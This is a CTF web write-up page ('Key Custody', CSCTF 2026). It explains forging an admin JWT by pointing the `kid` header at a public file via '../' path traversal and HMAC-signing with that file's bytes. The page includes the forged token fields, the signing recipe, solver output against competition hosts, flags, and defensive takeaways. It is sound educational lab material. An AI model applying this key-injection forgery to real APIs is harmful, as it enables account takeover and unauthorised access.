@@ -1,0 +1,59 @@
+<!doctype html>
+<html lang="en" data-mode="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; font-src 'self'; img-src 'self' data:; object-src 'none'; base-uri 'self'; form-action 'none'">
+<meta name="referrer" content="strict-origin-when-cross-origin">
+<title>Key Custody (Web writeup) | Theodore Garcia</title>
+<meta name="description" content="Never let attacker-controlled token metadata select the verification key. `kid` picked the HMAC secret, and the secret was a publicly downloadable file — so the attacker holds the key and can mint any token. Two failures had to line up: a `kid` resolved as a filesystem path (with `..` traversal), and a key source that is not actually secret. Either alone is bad; together they are a full admin forge. Defensive takeaways (API security / GRC angle): - Pin the algorithm AND resolve `kid` against a strict allow-list of key IDs mapped to secrets you control. Never - Signing keys must be secret and stored outside any web-served directory. A key that can be fetched over /public - Sanitise every externally supplied identifier used for lookup — reject `..`, absolute paths, and separators — - Bind sessions to immutable, server-issued claims and verify them server-side; here the admin route&#x27;s extra">
+<link rel="icon" href="../../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../../style.css?v=20261104a">
+<link rel="stylesheet" href="../../paper.css?v=20261104a">
+<script src="../../prefs.js?v=20261104a" data-static></script>
+</head>
+<body class="wu-body">
+<header class="wu-hero">
+  <div class="wu-wrap">
+    <nav class="wu-crumbs" aria-label="Breadcrumb"><a href="../../">Theodore Garcia</a><span>/</span><a href="../../#writeups">Writeups</a><span>/</span><span>CSCTF 2026</span></nav>
+    <p class="wu-kicker"><span class="wu-cat">Web</span><span class="wu-lvl">API, JWT HS256 `kid` key-injection — a public asset used as the signing key</span><span>4 steps · 4 min read</span></p>
+    <h1>Key Custody</h1>
+  </div>
+</header>
+<div class="wu-wrap wu-layout">
+  <article class="wu-article">
+    <aside class="wu-callout key"><h2>The trick</h2><p>Never let attacker-controlled token metadata select the verification key. `kid` picked the HMAC secret, and the secret was a publicly downloadable file — so the attacker holds the key and can mint any token. Two failures had to line up: a `kid` resolved as a filesystem path (with `..` traversal), and a key source that is not actually secret. Either alone is bad; together they are a full admin forge. Defensive takeaways (API security / GRC angle): - Pin the algorithm AND resolve `kid` against a strict allow-list of key IDs mapped to secrets you control. Never - Signing keys must be secret and stored outside any web-served directory. A key that can be fetched over /public - Sanitise every externally supplied identifier used for lookup — reject `..`, absolute paths, and separators — - Bind sessions to immutable, server-issued claims and verify them server-side; here the admin route's extra</p></aside>
+    <section class="wu-step" id="step-1">
+      <h2><span class="wu-n">01</span><b>Start point:</b> read the self-describing schema and your issued token.</h2>
+      <ul><li><b>GET /schema:</b> "Bearer JWT (HS256)"; the key line is verify = "the console loads each token's signing key by its `kid` (key id) header"; admin_only = "GET /admin/recovery-key requires the issued analyst subject and role=admin". Routes: GET /token, GET /public/{name} (public brand assets), GET /admin/recovery-key.</li><li><b>GET /token:</b> {"sub":"analyst-recon-17","role":"analyst","token":"&lt;JWT&gt;"} whose header decodes to {"alg":"HS256","typ":"JWT","kid":"session"} and body {"sub":"analyst-recon-17","role":"analyst"}.</li></ul>
+    </section>
+    <section class="wu-step" id="step-2">
+      <h2><span class="wu-n">02</span><b>Pivot:</b> the token chooses its own verification key.</h2>
+      <ul><li>"loads each token's signing key by its `kid`" means the HMAC secret is selected by an attacker-controlled header. The secret only has to be SECRET — but a public brand asset isn't: I can download its exact bytes. So if I point `kid` at a public asset and HMAC-sign with that asset's content, the console verifies against the same bytes and the forged token is valid.</li><li>Confirmed the admin route needs BOTH role=admin AND the issued subject: the issued analyst token on /admin/recovery-key returns 403 "issued analyst subject with role=admin required". So keep sub unchanged, flip role to admin.</li></ul>
+    </section>
+    <section class="wu-step" id="step-3">
+      <h2><span class="wu-n">03</span><b>Pivot:</b> find the public asset that serves as a readable key.</h2>
+      <ul><li>Enumerated /public/. Hit: GET /public/brand.txt (200, 201 bytes) — a plain banner, the "public bytes" I can use as the HMAC key.</li></ul>
+    </section>
+    <section class="wu-step" id="step-4">
+      <h2><span class="wu-n">04</span><b>Exploit:</b> forge an admin JWT keyed by the public asset.</h2>
+      <ul><li>Header {"alg":"HS256","typ":"JWT","kid":"../public/brand.txt"}, body {"sub":"analyst-recon-17","role":"admin"}.</li><li>key = the exact bytes of /public/brand.txt (including the trailing newline). sig = HMAC-SHA256(key, b64url(header)+"."+b64url(body)), base64url, no padding.</li><li>The `kid` needed a traversal prefix: the key loader resolves `kid` under a keystore directory, so a bare "brand.txt" failed to resolve; "../public/brand.txt" (relative to that dir) reaches the served asset. That the loader follows `..` at all is a second bug (no path sanitisation).</li><li>GET /admin/recovery-key with the forged Bearer token -&gt; 200 {"recovery_key":"<span class="flag" tabindex="0">CSCTF{Dk8U89uHR2NppHDtQNKcpR8h}</span>"}.</li><li>Live reproduction against a freshly-fetched instance (per-instance flag differs from the documented one above): ```text $ python -I solve.py http://w02.ctf.chronos-security.ro:33796 [*] issued subject: analyst-recon-17 [*] key source /public/brand.txt (201 bytes) [*] /admin/recovery-key -&gt; 200 {"recovery_key": "<span class="flag" tabindex="0">CSCTF{KbqmZ0n37WXJ8TmTFcOWNgqM}</span>"} [+] FLAG: <span class="flag" tabindex="0">CSCTF{KbqmZ0n37WXJ8TmTFcOWNgqM}</span> ``` Live-instance flag capture (the browser issuing the forged-token request against the live backend: the forged HS256 token with kid `../public/brand.txt` and role=admin, the authenticated GET, and the genuine 200 response carrying the custody recovery key):</li></ul>
+      <figure><a href="../img/csctf-2026/key-custody/01_flag_capture.webp" target="_blank" rel="noopener"><img src="../img/csctf-2026/key-custody/01_flag_capture.webp" alt="Key Custody — live-instance flag capture" width="1040" height="466" loading="lazy"></a><figcaption>Key Custody — live-instance flag capture</figcaption></figure>
+    </section>
+    <aside class="wu-callout"><h2>Reproduce</h2><p>python solve.py http://w03.ctf.chronos-security.ro:33157</p></aside>
+    <nav class="wu-nav" aria-label="More writeups"><a class="prev" href="interlock.html"><small>Previous</small>Interlock</a><a class="next" href="operation-dawn-the-dispatch-console.html"><small>Next</small>Operation Dawn - The Dispatch Console</a></nav>
+  </article>
+  <aside class="wu-side">
+    <dl class="wu-facts">
+      <dt>Event</dt><dd>CSCTF 2026</dd>
+      <dt>Category</dt><dd>Web · API, JWT HS256 `kid` key-injection — a public asset used as the signing key</dd>
+      <dt>Tools</dt><dd><ul class="wu-tools-list"><li>curl</li><li>Python (stdlib: hmac</li><li>hashlib</li><li>base64</li><li>urllib)</li><li>solve.py</li></ul></dd>
+      <dt>Flag</dt><dd class="wu-flag"><span class="flag" tabindex="0">CSCTF{Dk8U89uHR2NppHDtQNKcpR8h}</span><small>Tap, hover or Tab to reveal</small></dd>
+      <dt>Source</dt><dd><a class="wu-source" href="https://github.com/theoithinkk/CTFwriteups/blob/main/CSCTF/Web/Key%20Custody/writeup.md" target="_blank" rel="noopener">writeup.md on GitHub</a></dd>
+    </dl>
+    <nav class="wu-route" aria-label="The route"><p>The route</p><ol><li><a href="#step-1"><b>1</b><span>Read the self-describing schema and your…</span></a></li><li><a href="#step-2"><b>2</b><span>Token chooses its own verification key</span></a></li><li><a href="#step-3"><b>3</b><span>Find the public asset that serves as a…</span></a></li><li><a href="#step-4"><b>4</b><span>Forge an admin JWT keyed by the public asset</span></a></li></ol></nav>
+  </aside>
+</div>
+<script src="../wu.js?v=20261104a" defer></script>
+</body>
+</html>
